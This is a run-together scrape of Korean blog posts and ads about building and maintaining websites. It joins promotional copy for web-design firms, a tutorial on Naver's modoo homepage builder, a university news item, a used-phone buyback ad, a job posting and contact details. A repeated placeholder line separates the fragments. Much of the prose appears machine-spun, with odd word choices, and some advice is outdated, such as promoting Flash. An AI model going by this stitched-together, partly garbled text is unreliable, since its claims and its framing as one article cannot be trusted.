바랍니다.최근 싸이트 형태 트렌드를 살펴보면 현란한 디자인보다는군더더기 없는 정갈한 이미지의 홈페이지가 확실히 사랑받고 있으며,홈페이지 선정 금융사와 매매를 할 상황이라면 처음에 시안 작업 및 검수부터 이후 시정 및 관리의 구체적으로 항목에다 대하여 어떠한 바탕으로 돈은 청구되는지 디테일하게 검토하고업체와 조정을 사용해 구매 체크사항 복구 및 추가를 통해서 기업 매입을 이용되는 부분이 굉장히 좋습니다.개인홈페이지 제작, 이것만은 반드시 명심하세요!개인 홈페이지 제작을 요청할 시 홈페이지 제작사의 포트폴리오를 확인하여 어떤 구성으로 제작해주는지, 디자인 스타일이 나와 맞는지 등을 살펴 볼 수 있으며,홈페이지를 제작 시 개인 서버를 사용할 때는 추후 문제가 발생되면 서버의 유니트를 교체해야 하거나 전문가의 도움이 필요할 때가 많아 유지 보수가 쉽지않고 많은 비용이 발생할 수 있습니다.홈페이지 제작을 계획하는 경우, 대체로 홈페이지에 대한 전문적인 지식이 부족하기 때문에 홈페이지 제작 전문 업체를 선택해서, 제작을 맡기는 것이 현명합니다.개인 모바일 홈페이지를 직접 제작하고 싶다면 무료로 주어지는 툴을 사용해 보는 것도 무난합니다. 그렇지만 제공되는 템플릿 외에 각 종의 디자인 적용이 가능하지 않다는 안좋은 점이 있습니다.개인이 온라인을 기획할 때 지속적으로 볼 때에 개인 웹서버를 이용되는 방식보다 대행업체를 사용해보는 방법이 금액이나 학습시간 등의 측면에서더욱 효율적일 수 있습니다.가장 효율적인 쇼핑몰 설계를 원한다면? 원데이넷 서비스를 선택하세요!원데이넷은 손쉽게 쇼핑몰을 만들 수 있는 독립형 솔루션 하이센스 2.0을 판매합니다.하이센스 2.0은 급변하는 웹 트렌드에 맞춰 제작된 솔루션이에요.코딩 시스템이 간단해 작업자가 관리하기 편한 것은 기본,모바일 기기 크기에 따라 달라지는 똑똑한 화면으로 고객 편의성도 뛰어납니다!원데이넷 하이센스 2.0으로 사용자 관리자 모두에게 최적의 모바일 샵을 만들어 보세요!구매 시 평생 라이선스가 보장되는 알뜰한 서비스!늘 부담 없이 저렴한 비용으로 소개합니다.홈페이지제작및관리에 대한 정보 유익하셨나요? 몰두하고 봐서 눈이 피로하시다고요?미국의 한 대학교에서 일상에서 눈의 피로를 풀어주는 20/20/20운동을 소개했습니다.20분마다 눈을 돌리고 20피트 거리를 20초간 보는 거예요! 쉽죠?잠시 밖을 바라보고 눈의 피로를 풀어주세요~! 오늘도 꽉찬 하루 되세요!!네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 무언가 머뭇거리는 게 있나요? 큰 도전을 앞두고 있거나, 변화를 앞에 두었을 때할까 말까 망설이게 됩니다. 하지만 할까 말까 고민하는 시간에 그냥 해버리는 건 어때요?아무것도 없이 고민만 하는 것보다는 어떠한 결과를 얻을 수 있도록 한 번 하는 게 중요하니까요. 볼까 말까 고민했던 홈페이지제작및관리에 대한 포스팅, 오늘은 확실하게 보자고요! ^^  상품을 판매하는 쇼핑몰이 홈페이지를 만들 경우, 직관적인 상품 리스트를구성하여 통상적이면서 합리적인 홈페이지로 만드는 것이 현명합니다. 무엇보다 홈페이지는 온라인 상으로 마주하는 고객들의 시선을 끌어당겨,매출을 향상시키는데 가장 크게 기여하는 필수적인 요소입니다.일반 카탈로그 페이지와 비교했을 때 쇼핑몰 사이트 같은 경우구매자와 판매자 간 금전 거래가 발생해 세무당국에 신고하여사업체 자체로의 확인을 받고 웹페이지에 반드시 표기해야 합니다.이와 더불어 홈페이지에 견적 또는 문의 게시판을 생성하여 고객의 질문의나 건의를유동적으로 확인할 수 있도록 해야 제대로 된 홈페이지 관리가 이루어집니다.오늘날에는 무료 워드프레스 프로그램을 통해 쇼핑몰 홈을 쉽게 만들 수 있는데요.쇼핑몰 홈페이지 내 SEO 적용여부, 소셜 접속, 전자결제 연동, 간편결제 툴 등을미리 확인해두면 보다 용이하게 제작 및 유지, 보수를 진행할 수 있습니다. 홈페이지 관리 대행업체를 이용하셔서 페이지를 관리하면 악성코드를 줄일 수 있죠.보안서비스가 있기 때문에 악성코드를 제거하고 스팸메일을 줄여주는 등 관리가 수월합니다.또한, 홈페이지 관리 업체를 사용하는 경우엔 이미지나 디자인 수정을 의뢰할 수 있습니다.디자이너를 고용하기 힘든 기업들은 그런 일을 수행할 수 있어서 특히 유용하죠.이와 더불어 홈페이지 제작 대행업체에 홈페이지를 의뢰할 시 모바일페이지도 함께 제작할 수 있죠.모바일용 화면을 같이 제작하면 모바일로 들어오는 사람들도 불편 없이 이용할 수 있다고 합니다.특히 홈페이지 제작 기업에 의뢰해서 웹사이트를 만든다면 이미지 저작권에서 자유롭습니다.홈페이지를 만들 때 이미지가 많이 필요한데 이러한 업체는 전부 저작권에 결점이 없는이미지들을 보관하고 사용하므로 향후 저작권 소송 등의 문제가 적어진답니다.홈페이지 제작을 대행업체에 신청하면 전문가의 손길로 프로페셔널한 홈페이지가 만들어집니다.수년간의 경험과 노하우를 가지고 있는 제작업체들은 직접 만드는 홈페이지보다 퀄리티가 권장됩니다. 관능적이며 고객의 호기심을 끌어당기는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 생각하고 또 생각하며 제작하고 있으며 소비자가 사용하기 편하고업체가 잘 기억될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 퀄리티 있는 디자인을 제작해 드리겠습니다.어떤 것을 완전히 알려거든 그것을 다른 이에게 가르치라는 명언이 있습니다.오늘 공부한 홈페이지제작및관리에 대한 이야기를 친구에게 전해보세요!홈페이지제작및관리에 대해 완전히 알 수 있는 계기가 될 거예요. ^^네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요!온라인마케터 양성과정 교육을 통해서이번주는 모두홈페이지 제작방법을 배웠어요​나는 마켓을 하지도 가게를 운영하지 않는데요? 라고 싶기도하지만모두홈페이지 는 단순히 쇼핑몰을 위한 홈페이지가 아니라나를 소개하는 명함으로도 활용하는 등등다양하게 활용할 수 있지요그리고 거기다가 모두홈페이지 는무료홈페이지 라니 안만들수가 없지요!​모두홈페이지 를 개인적인 용도로나중에 포트폴리오로 활용할 수도 있다고하니온라인마케터에 관심이 있다면일단 하나 만들어두면 좋겠더라고요 모두홈페이지는 네이버에서 바로 모두홈페이지를 검색해도 되고네이버 메인에서 더보기를 누르면modoo! 가 보일꺼에요 네이버를 로그인을 하고 들어간거라이미 로그인이 들어있어요톱니바퀴 모양인 홈페이지 관리로 들어가면돼요만약 처음이시라면 모두홈페이지 제작 동의하고 들어가시면 됩니당 ​저는 온라인마케터 양성과정 교육시간에이미 만들어둔 홈페이지가 하나 보여요모두홈페이지는 네이버 한 아이디당3개의 모두홈페이지를 개설할 수 있어요​또 선물하기 기능을 통해서 선물을 받는다면3개보다 더 많은 홈페이지를 관리할 수 있지요​ 모두홈페이지 만들기우선 포스팅을 위해서 홈페이지를 하나 추가해봤어요  새 홈페이지 추가하기 + 를 클릭하면모두홈페이지가 바로 만들어집니다 라고 팝업창이떠요톡톡이나 이메일로 안내 받기를 원하지 않으면체크를 해제하고 동의를 클릭!그러면 내 홈페이지에 딱 맞는 구성을 추천해주는 팝업창이 떠요하지만 간단히 내가 필요한 것만 만들거라서팝업창을 닫아주고 진행했어요 그러면 이렇게 홈페이지를 만드는 화면이 떠요먼저 기본편집에서 홈페이지 정보를 수정해볼게요 *필수입력사항을 모두 입력해줘야지 저장할 수 있어요인터넷주소 외에는 언제든지 수정할 수 있으니연습한다 생각하고 처음에 무엇이든 적어보면 좋아요 저는 모두홈페이지를 활용해서 포트폴리오처럼사용해보려고 만들었어요​모두홈페이지주소는 한달에 3번 변경할 수 있어요하지만 보통은 주소로 검색해서 유입되지 않으니크게 신경쓰지 않아도 된다고해요​ ​메인 홈을 꾸며 줄꺼에요사진은 최대 4장을 넣을 수 있어서저는 꿈을 향한 이미지를 찾다가분홍분홍 꽃길만 걷길 바라는 의미로분홍색 이미지들로 채웠어요사진은 드래그앤드롭하면 순서를 변경할 수 있고첫번째 사진에 맞게 추천컬러도 나오기도하고내가 직접선택해서 색상을 바꿀 수 도 있어요​TIP! 사진들은 비슷한 색감을 사용하면 좋아요​ 사진을 넣어주고 아래로 스크롤하면전화/톡톡/공유 기능도 있지만개인용으로 사용할 꺼라서 따로 사용하지는 않으려고요​소개에서는 공지사항이나 일정에 대한 제목을 넣으면돼요공지사항 또는 7월프로모션 등등 간단히 적고자세한 내용은 소개/공지 한마디에 적으시면 되지요 이렇게 간단히 설정하고서 임시저장을 눌러줬어요임시저장 버튼이 있다는건작업하다가 튕길 수도 있다는 거니중간중간 눌러주면 좋아요~​이상태에서 홈페이지 반영하기를 누르면비어있는 페이지명을 입력하라는 안내가 뜨는홈 메인만 만들고 나서 반영하고 싶다면비어어있는 페이지는 삭제해주시면 돼요 이미 만들어져있는 페이지를 삭제하거나 복사하고 싶다면페이지명 오른쪽에 있는 톱니바퀴를 클릭하면돼요 페이지추가 버튼을 클릭하면다양한 기능을 가진 페이지들이 나와요SNS연결할 수 있는 페이지도 있으니자신의 SNS를 등록해두면 좋을 것 같아요​오늘은 여기까지!페이지에 대한 다양한 기능과모두홈페이지를 활용한 키워드 노출 꿀팁은다음시간에 포스팅할게요!​ 온라인마테터 양성과정 교육시간에 만든 모두홈페이지에요~  ​​#모두홈페이지 #무료홈페이지 #무료홈페이지만들기#모두홈페이지제작 #모두홈페이지만드는방법 #온라인명함 #모두홈페이지명함#포트폴리오만들기 #개인모두홈페이지 #네이버홈페이지 #개인홈페이지 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가정보를 보면 뇌세포가 자극되고 뇌가 균형을 잡게 된다고 합니다.여기 제가 마련한 홈페이지제작및관리에 대한 정보를 보면여러분의 뇌가 틀림없이 자극될 것 같은데요~? 여러분의 신경에 도끼가 되어줄 홈페이지제작및관리에 관한 정보! 꼭 공부하세요.기본적인 솔루션형 홈페이지의 경우, 저렴한 가격으로 제작할 수 있지만 디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 최적화된 홈페이지 관리가 필요하거나지속적인 관리하기가 필요한 홈페이지의 경우, 맞춤형 서비스를 이용해 보는 것이 좋습니다로그분석에 이용되는 액세스로그는 업체의 홈페이지에 접속한 방문객들이 홈페이지를 돌아다니며 요청했던 파일들을 기록해 놓은 로그입니다. 액세스로그의 자료를 분석하여 홈페이지에 접속한 고객층의 흥미를 파악할 수도 있습니다.또한 전자 결제서비스의 경우, 결제시스템을 이용하여 카드결제나 실시간 계좌이체 등을 즉시 확인할 수 있습니다.또한, 매출의 집계나 결제 기록을 관리할 수 있어서 편리합니다.그리고 부정클릭이란 광고비를 빠르게 소진하게 만들려는 악의적인 의도를 가지고마구잡이로 클릭하는 것을 말하는데, 홈페이지 관리비가 많이들어갈 수 있기 때문에 로그분석을 통해 확인하시는 것이 좋습니다.부정클릭 차단을 하고 싶다면 네이버 계정 IP 차단 기능을 사용하는 것이 좋은데요. 네이버 계정에서 관리 도구 그리고 광고 노출 제한 관리를 통해 해당 IP에는 해당 홈페이지가 드러나지 않도록 조치할 수 있답니다.최근에는 정적인 홈페이지보다 동적인 웹페이지에 관한 관심이 높아지고 있습니다.예를 들면 기본적으로 스크롤 형식이 아니고 한 페이지 내에서 전반적으로 컨텐츠를 보여준 다음마우스로 원하는 메뉴를 클릭하면 그 컨텐츠로 이동하는 방식을 상당히 사용하고 있습니다.홈페이지에서 움직이는 그래픽을 연출하게 대행하는 프로그램이 당장 플래시입니다. 따라서 플래시를 적절히 사용해 더욱 무수한 디자인의 사이트를 계획할 수 있습니다.플래시로 웹페이지를 만든다고 해서 무조건 유동적인 디자인만 허락되는 것이 아닙니다.정적이고 심플하며 군더더기 없이 단정한 디자인도 가능하므로플래시로 더 전문적이고 고퀄리티의 디자인도 구현이 가능합니다.그리고 세계적으로 인터넷을 쓸 경우에는 익스플로러, 크롬, Firefox, 오페라 등과 같이 여러종류의 브라우저들을 활용합니다.그러하므로 홈페이지 코딩 작업진행시는 모든 브라우저에서 홈페이지가 제대로 보일 수 있도록 ‘웹 표준’에 맞게 코딩하는 부분이 정말로 중요합니다.참고로 인터넷홈페이지 화면을 제작 시 너무 많은 이미지나 동영상을 삽입하게 되면, 화면은 화려해 질 수 있으나 속도의 저하를 초래할 수 있으니 조심하는 것이 좋습니다.관능적이며 고객의 흥미를 유발하는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 여러 가지를 고려하여 제작하고 있으며 소비자가 사용하기 손쉽고인상깊은 업체가 될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 양질의 디자인을 제작해 드리겠습니다. 홈페이지제작및관리에 관한 정보들, 꼼꼼히 확인 하셨나요?아는 것에 그치지 않고, 유용하게 활용하는 것 또한 그에 못지 않게 중요하다는 사실!잊지 마세요~앞으로도 도움이 되는 포스팅 자주 업데이트 하겠습니다^^이웃 추가 해주시고 자주 방문 해주세요~ 네이버 블로그는 맞지만, 확인불가  지난 2일, 본교는 홈페이지에서 규정관리시스템 서비스를 시작했다. 규정관리시스템은 학칙이나 학사행정과 같은 규정정보를 사용자가 관리 및 조회할 수 있도록 하는 시스템이다.규정관리시스템의 주요 기능은 ▲규정정보검색 ▲입안편집 ▲문서변환 ▲미리보기 등이다. 규정정보검색은 원하는 규정정보를 키워드별, 부서별로 검색할 수 있는 기능이다. 기존에는 각 규정문서를 다운로드 받아야만 내용을 확인할 수 있었다. 사용자는 규정정보검색 기능을 통해 문서 다운로드 없이 규정정보를 찾을 수 있다.입안편집은 교내 각 행정부서가 규정의 제·개정 및 폐지안이 있을시 필요한 서식을 생성하는 기능이다. 사용자가 정해진 서식에 규정의 내용을 일일이 작성했던 기존과 달리 지금은 바꾸고자 하는 내용만 변경할 수 있다.문서변환은 규정의 제·개정 후, 문서를 시스템에 이관하기 위해 한글, PDF, XML 형식으로 자동 변환하는 기능이다. 기존 규정집에서는 필요한 서식이 한글 및 PDF 파일로만 제공돼, 사용자가 직접 문서를 원하는 형식으로 변환해야 했다.미리보기는 규정에 별표 및 별지 같은 추가 정보가 있을시 서식을 다운로드 받기 전에 내용을 확인할 수 있는 기능이다. 기존 규정집에서는 규정문서에 별표 및 별지 서식이 포함돼, 내용을 확인하지 못하고 문서를 다운로드 받아야 했다.​박지연 기자pjy0314@hansung.ac.kr       안녕하세요~!원주/춘천홈페이지제작 회사 (주)케이아이비입니다^^    오늘의 주제는 홈페이지제작후 사후관리에 대해 알아보려 합니다!!!         열심히 공들여서 홈페이지를 제작한 후!홈페이지를 제대로 알차게 사용하려면꾸준한 홈페이지 관리가 되어야 합니다^^   홈페이지는 제작후 감상용이 아닌 제.대.로 사용을 해야 진정한 밫을 발하기 때문입니다.   그래서 그 무엇보다 제작후 관리가 필요합니다.!!            하지만 바쁜 업무와 일상에서홈페이지 까지 관리하기엔 어려움이 있습니다.   거기다 간단하지 않고 전문적인 부분을 건들기란 결고 쉽지 않습니다.   그래서 가장 좋은 방법은 홈페이지를 제작한 업체 또는 홈페이지 제작업체와 유지보수를 하는 것이 좋은데요! ​​​​​​     확실히 처음부터 홈페이지를 제작한 업체와 함께 하시는 것이 누구보다 그 홈페이지에대해 잘 알고 있으니 유지보수에 대해 더큰 만족을 얻으실 수 있습니다.^^   유지보수라는 것은 비용이 발생하기도 합니다.   하지만 공들여 많은 비용을 들인홈페이지를 그저 방치하는 것 보다꾸준한 유지보수를 통해 그 홈페이지가 운영되고 있다는 것을 보여주는 것이 더 중요 하다고 할 수 있습니다.^^        ​​​ ​​ 이제 홈페이지 유지보수도 저희 주식회사케이아이비와 함께 하세요!!            네이버 블로그는 맞지만, 확인불가 홈페이지제작및관리, 기대 이상 정보 공개! 개인홈페이지 제작에 대한 필수 팁 공개!      일상속에서 쉽게 접해볼 수 있는 홈페이지제작및관리그런데 확실히 알고 계신건가요?혹시 불확실한 정보를 접하고 계시진 않으신가요?그래서 오늘은 홈페이지제작및관리에 대한 분명한 정보를 소개해드리겠습니다!         홈페이지 제작을 계획할 때 대체로 홈페이지에 대한 전문적인 지식이 부족하기 때문에           홈페이지 전문업체를 선정해 제작을 위탁하는 것이 좋습니다.     제작업체에 위탁할 할 때는 업체의 기술적 측면도 뛰어나야 하지만 디자인 감성이 나와 잘 맞는지, 내가 요구하는 바를 정확하게 적용해 이미지화할 수 있는지도 체크해보아야 합니다.특히 개인 홈페이지를 제작할 때에는 누가 어떻게 작업할 것인지를 따져봐야 해요. 준비하고 있는 제작 시간, 내 컴퓨터 사용 능력, 디자인 능력, 예산 등을 모두 고려하여본인이 직접 제작할 것인지 전문 홈페이지 제작업체에 문의를 할 것인지를 판단하면 됩니다.업체에 개인 홈페이지 제작을 요구할 것이라면 홈페이지 제작사의 포트폴리오를 통해 어떤 방법으로 제작해주는지, 디자인 스타일이 나와 맞는지 등을 분석해 볼 수 있어요.     만약 자신이 직접 제작할 계획을 세웠다면 홈페이지 제작 툴에 대해서도 살펴봐야 하죠.    참고로 사람들이 많이 활용하는 기본적인 홈페이지 툴로는 워드프레스와 제로보드 XE가 있습니다.        너에게만 알려주는 홈페이지 백업 정보!        홈페이지 관리 중 컨텐츠나 페이지를 실수로 지웠을 경우를 대비해서 백업 작업은 필수인데요.홈페이지를 확실하게 백업해 두었다면 언제라도 원상복구가 가능합니다.특히 홈페이지 제작 완료 후 부족한 부분을 보완하다 보면 수정한 부분이 마음에 들지 않아 원상태로 되돌아가고 싶은 경우가 있기 때문에 꼭 백업을 해둬야 해요.만약 홈페이지가 해킹돼 문제가 발견됐을 때라면 백업 파일을 불러와 복구가 가능합니다.따라서 사이트를 관리 중이라면 백업을 주기적으로 하는 것이 효과적이에요.홈페이지 제작을 전문업체에 맡겼을 때는 백업 계약을 약정해 놓는 것이 좋습니다.계약 목록에 일정한 기간마다 백업 문서를 제공받기로 명시해 둔다면각종 파일과 소스를 보장받을 수 있다고 하니 일석이조랍니다.     이뿐만 아니라 제작이 완료된 홈페이지를 타인에게 보이게 하기 위해서는     웹 서비스가 가능한 홈페이지의 웹서버에 내 홈페이지 문서를 등록해야 하는데요.이 때 서버라는 건, 클라이언트의 요청에 반응하는 프로그램을 의미한답니다.    같은 기종이어도 가격이 제각각인 중고폰 매입, 믿을만한 곳에서 하는 곳이 중요합니다.    신뢰를 기반으로 품질 높은 서비스를 제공하는 폰스샵에서 현명하게 중고폰 매입하세요!    타사보다 무조건 높은 매입가를 자랑하는 아이폰 중고 전문 매입업체인 폰스샵은일반 폰은 물론 깨진 액정 및 파손폰도 의뢰 시 바로 매입해 높은 고객 만족도를 달성하고 있습니다.    매입 후 지체없이 현금으로 입금해 드리는 폰스샵의 신속 정확한 일 처리!파손 여부와 무관하게 완벽하게 복구해 드리는 액정 수리 서비스도 경험하세요!    얼마를 생각하든, 기대 이상의 매입가를 약속하는 폰스샵이 여러분을 기다립니다!매입 관련 문의 상담 >> 1588-9638       제가 드린 홈페이지제작및관리에 관한 정보에서 해답을 찾으셨나요?혹시 모자란 정보는 없었나요?아직 명확한 해답을 찾지 못한 분들이 계신다면 필요한 정보를 찾아다시 돌아오겠습니다. 조금만 기다려 주세요~!!  네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가  안녕하세요  저희 지오인프라는 충남 홍성에 위치한 홈페이지 제작 전문 회사 지오인프라 입니다. 충남권 전지역 · 대전 쪽에서 홈페이지 제작 및 관리에 관한 문의가 많은데요 ~저희 포트폴리오를 보시면 ~ 다양한 지역, 다양한 업태의 홈페이지 제작을 최상의 퀄리티로  제작해 드리고 있습니다.   저희가 제작해 드리는 홈페이지는 반응형 홈페이지라고해서요즘 pc 뿐만아니라 스마트 폰에서 홈페이지를 많이들 보시는데 스마트 폰에서도 pc 와 동일한 화면을 보실 수 있게반응형 홈페이지로 제작해 드리고 있습니다.​   지오인프라에서 제작한 반응형 홈페이지 ​홈페이지 관리는 어떻게 하나요 ..? 홈페이지 제작도 중요하지만 제작 이후 관리도 매우 중요합니다.홈페이지 관리를  어렵게 느끼시는 분들이 많습니다 ~저희는 이부분을 해결하고자 편하게 관리 하실 수 있게 관리자 가이드를 제공드립니다.  지오EZ 홈페이지 관리자 홈페이지 유지보수 신청은 어떻게 하나요 ..? 저희 지오인프라에서 개발한 CMS를 통해 유지보수를 편하게 이용 하실 수 있습니다.언제든 수정사항을 게시판에 등록만 해주시면 해당 담당자가 확인하기 때문에제작 이후에도 관리 까지 편하게 이용 하실 수 있습니다.  홈페이지 유지보수 신청 ​홈페이지 제작을 고민해 보신분들은 충남 전지역 홈페이지 /반응형 홈페이지 제작 및 관리를 전문적으로 하는지오인프라에서 홈페이지 제작 및 견적 문의 해보세요 ~  지오 EZ 홈페이지 가격 문의 지오이지임대형홈페이지, 쇼핑몰, 홍보형, 반응형, 홈페이이지 제작www.gioez.co.kr 청운대학교 창업보육센터충청남도 홍성군 홍성읍 대학길 25 청운대학교 창업보육센터 (Blue Innovation)  충남 홍성 홈페이지 제작 관련 문의는 저희 (주)지오인프라 에서 방문 상담도 가능합니다.​주소 : 충남 홍성군 홍성읍 대학길 25 창업보육센터 214호  궁금하신 사항 있으시면 언제든 방문해 주세요 ​#반응형홈페이지 #충남반응형홈페이지 #충남홍성홈페이지 #홍성홈페이지 #홍성홈페이지관리 #홍성반응형홈페이지 #대전홈페이지 #대전반응형홈페이지 #홈페이지제작 http://itnjob.com/work/employ_detail.html?no=5369IT 채용[ITnJOB]IT 채용, 개발자 채용 , 앱개발자, 네트워크, 웹디자이너, 무료배너 광고, IT 교육 소개, IT 구인구직 사이트 - 아이티앤잡itnjob.com모집직종웹디자인/기획/운영＞컨텐츠개발/기획/운영근무지역경북 전지역담당업무- 초대졸 이상 - 홈페이지 유지 / 관리 / 운용 - 홈페이지 제작(총괄) / 리뉴얼- 사이트 블로그 내용 작업 및 업데이트 - SNS 내용 업데이트 및 관리- 포토샵, 일러스트 능숙자 - 인쇄기획, 이벤트 기획 및 진행 경험자- 온/오프라인 홍보 기획,진행 경험자(홈페이지/SNS) - 기타 사무(회사내 안내물 등)모집인원1명근무형태기간의 정함이 없는 근로계약/ 파견근로 비희망급여사항연봉20,000,000원 이상, 면접 후 재조정 가능복리후생국민연금 고용보험 산재보험 의료보험자격요건학력대학(2~3년) 졸업↑경력무관우대조건인근거주자, 차량소지자근무예정지(780280) 경상북도 경주시 보문로 74-14, 185-1 (북군동)근무시간평일 : (오전) 9시 30분~(오후) 7시 00분, 주 5일 근무, 평균근무시간 : 40퇴직금퇴직연금외국어능력영어(중)전공자격면허컴퓨터활용능력문서작성,스프레드시트,프리젠테이션,기타(포토샵/일러스트 능숙자)병역특례채용희망비희망 인생이 끝날까 두려워하기 보다, 인생이 아직 시작조차 하지 않았다는 것을 두려워하라!그레이스 한센이 남긴 말이라고 합니다.아직도 홈페이지제작및관리에 관해 생각만 하고 계신 건 아니겠죠?우리 다 함께 으쌰으쌰~ 홈페이지제작및관리에 관한 정보를 공유해 보도록 해요.온라인 시장에 뛰어들기로 계획한 이상, 제일 반드시 진행해야 하는 부분이 바로 홈페이지를 시작하는 것입니다.홈페이지는 제작 하나만 아니라 꾸준히 관리해서 사업에 이바지하도록 하는 것이 훨씬 중요합니다. 이를 위해서는 계속적으로 제품을 정리하거나 수정하고 관리하여야 하니 쉬운 조작이 가능한 홈페이지 관리 툴을 이용하는 것이 편합니다.그리고 특히 수출업체 홍보 목적 홈페이지의 경우 익스플로어, Firefox, 애플 사파리 등의 웹브라우저에서 호환성이 보장되도록 홈페이지를 제작하고 수정해야 합니다. 그렇지 않으면 잠재고객의 접근을 본질적으로 불가능하게 하는 결과를 가져올 것입니다.또한 홈페이지를 만들 때에는 주제가 확실한 본인만의 홈페이지를 기획해야 하는데, 그러기 위해선 웹페이지에 포스팅할 정보들을 늘 기억하기 쉽게 취합하여 정리해두어야 합니다. 참고로 과금하지 않고 웹서버를 제공해주는 사이트의 경우 홈페이지 마법사 같은 시스템을 이용하여 홈페이지를 구축할 수 있는데요. 해당 사이트에 무료 회원가입을 하면 곧바로 활용할 수 있습니다. 홈페이지 빌더는 단시간 내에 편리한 방법으로 홈페이지를 만들 수 있는 서비스입니다.원하는 디자인의 홈페이지 스킨을 선택한 후 카테고리나 내용, 사진 등을 간단하게 수정하면즉각적으로 사용이 가능한 홈페이지를 개설할 수 있습니다.이처럼 홈페이지 빌더는 기본적으로 제공되는 레이아웃을 이용하여서 사용자가 직접 홈페이지를 제작할 수 있는 방식을 말합니다.뿐만 아니라, 사용자가 폰트나 이미지의 위치, 크기, 메뉴와 게시판 등을 조절할 수 있어홈페이지를 다양하고 자유롭게 디자인할 수 있다는 장점을 가지고 있습니다.홈페이지 빌더를 통해 저렴한 비용으로 간편히 홈페이지를 만들 수 있는데요. 업종별로 수많은 레이아웃 중에 원하는 디자인을 선택해서손쉽게 완성도 높은 홈페이지 제작이 가능하며,직접 만든 디자인을 적용할 수도 있어 개성 있는 연출 역시 가능합니다.특히 최근에 부담스러운 홈페이지 제작 비용을 낮추고, 까다로워진 포털 사이트 내 홈페이지 등록 기준을 충족시키기 위하여 홈페이지 빌더를 이용하는 업체들이 늘어나고 있습니다.홈페이지 빌더는 저렴한 비용으로 단기간에 홈페이지를 제작할 수 있으며,수정 또한 가능하여 큰 인기를 끌고 있습니다. 참고로 이제 홈페이지 뿐 아니고, 블로그나 SNS를 통한 업체 홍보가 꼭 필수인 시대입니다.따라서 기존 홈페이지를 별도의 모바일 버전으로 따로 제작하는 대신에하나의 홈페이지를 제작하면 모든 종류의 디스플레이에서 적용이 되는반응형 홈페이지 빌더가 각광받고 있습니다.  감각적이고 고객의 호기심을 끌어당기는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 여러 가지를 고려하여 제작하고 있으며 소비자가 사용하기 손쉽고업체가 잘 기억될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 양질의 디자인을 제작해 드리겠습니다.'사랑해'라는 말은 참 언제 들어도 좋은 말이지요.헌데 듣기에는 좋아도 하기에는 왜 그토록 힘이 들까요? 조금 부끄럽지만, 오늘은 곁에 있는 분들에게 사랑한다는 말 한마디 건네야겠습니다.여러분에게도 사랑한다는 말 전하면서~ 오늘 홈페이지제작및관리 포스팅 정리할게요!네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가간단한 홈페이지 이미지 제작요즘 회사마다 홈페이지나 쇼핑몰을 운영하는 업체가 대다수라웹디자이너분들이 한분씩 계시죠?  홈페이지 관리도 해야하고 쇼핑몰 신제품도 업데이트도 해야하고..그런데 간단한 홈페이지 이미지 수정이나 네이버블로그 네이버카페에 들어가는 이미지 제작에고생을 하시죠. 블로그 스킨 제작부터 간단한 이미지 제작 수정까지 저렴한 비용으로 제작해 드립니다.sjdj11@naver.com 010-9445-0702 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가광주홈페이지제작 및 관리 월 비용 견적바른웹​​안녕하세요.공공기관이든 개인 서비스업이든 비대면이 더욱 활성화되어가고 있는 요즘, 웹 상의 홈페이지는 그야말로 사업장의 대문이라고 볼 수 있습니다. ​​​​ ​​​​​온갖 다양한 홈페이지들이 있지만 막상 구독성이 높고 심미성 또한 좋아야 소비자들의 눈길이 오래 머물러 매출에도 영향을 주게 됩니다. ​​블로그형 홈페이지, 반응형 홈페이지, 모바일 홈페이지 등 고객과 직접소통할 수 있으면서 사업체를제대로 홍보하고 마케팅할 수 있는 홈페이지를 구축하려면이를 가능하게 해줄 수 있는 업체를만나야 하는 게 우선이지요.​​광주홈페이지 제작을 검색해보면수많은 업체들이 있지만 단순한 제작만이 아닌 마케팅을 고려한 웹디자인을 구현하는 실력있는 업체를 알아보기는 어렵습니다.​​​​​ ​​​​​경쟁구도가 심한 업계에서 오랜 기간 활동해 왔다는 것 자체가 그 업체의 실력을 말해주는 것이라고도 볼 수 있는데요. ​​홈페이지 제작 업체가 5년 이상유지하며 활발히 활동한다는 것은 그만한 기술력을 갖추고 있다는 뜻입니다. ​​그런 의미에서 10년이 가까이 수많은 홈페이지를 제작, 관리해 온 바른웹은 실제로 소비자들이 만족할 만한홈페이지를 제작하는 실력있는 업체라고 확신할 수 있습니다. ​​​​​ ​​​​​10대 쇼핑몰 사장이 급증했다는 뉴스를 최근에 접한적이 이었는데요.이렇듯 갈수록 다양한 연령에서소자본으로 창업하는 분들이 늘어나고 있어요. ​​자본을 전략적으로 투자해야 하는 소자본 창업가 분들에게는 홈페이지 구축이 필수적이지만초기 목돈이나 큰 액수를 지출하기에 벅찬 것이 사실입니다. ​​​​ ​​​​퀄리티는 높고, 가격은 만족스러운 브랜드 홈페이지 제작과 더불어 매달 수정 및 관리까지 